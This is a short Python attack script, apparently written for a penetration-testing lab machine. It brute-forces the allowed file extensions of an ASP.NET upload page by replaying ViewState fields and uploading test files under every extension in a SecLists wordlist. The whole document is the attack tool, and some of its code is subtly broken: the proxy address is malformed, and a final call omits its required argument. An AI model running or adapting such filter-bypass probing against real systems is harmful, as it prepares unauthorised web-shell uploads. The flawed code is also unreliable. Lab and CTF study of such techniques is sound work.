#!/usr/bin/python3

from pwn import *
import signal, time, pdb, sys, requests

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

# Variabls globales
transfer_url = "http://10.10.10.93/transfer.aspx"  # Ip de la máquina 
burp = {'http': 'http://127.0.0.1.:8080'}          # Conexión con Burbsuite   

def uploadFile(extension):

    s = requests.session()
    r = s.get(transfer_url)

    viewState = re.findall(r'id="__VIEWSTATE" value="(.*?)"', r.text)[0]
    eventValidation = re.findall(r'id="__EVENTVALIDATION" value="(.*?)"', r.text)[0]

    post_data = {
         '__VIEWSTATE': viewState,
         '__EVENTVALIDATION': eventValidation,
         'btnUpload': 'Upload'
    }

    fileUploaded = {'FileUpload1': ('Prueba%s' % extension, 'Esto es una prueba')}

    r = s.post(transfer_url, data=post_data, files=fileUploaded)    # Para añadir conexión con Burpsuite incluir ", proxies=burp" 

    if "Invalid File. Please try again" not in r.text:
        log.info("La extensión %s es valida" % extension)

if __name__ == '__main__':

    f = open("/usr/share/seclists/Discovery/Web-Content/raft-medium-extensions.txt","rb")

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque de fuerza bruta")

    for extension in f.readlines():
        extension = extension.decode().strip()
        p1.status("Probando con la extensión %s" % extension)
        uploadFile(extension)

    uploadFile()
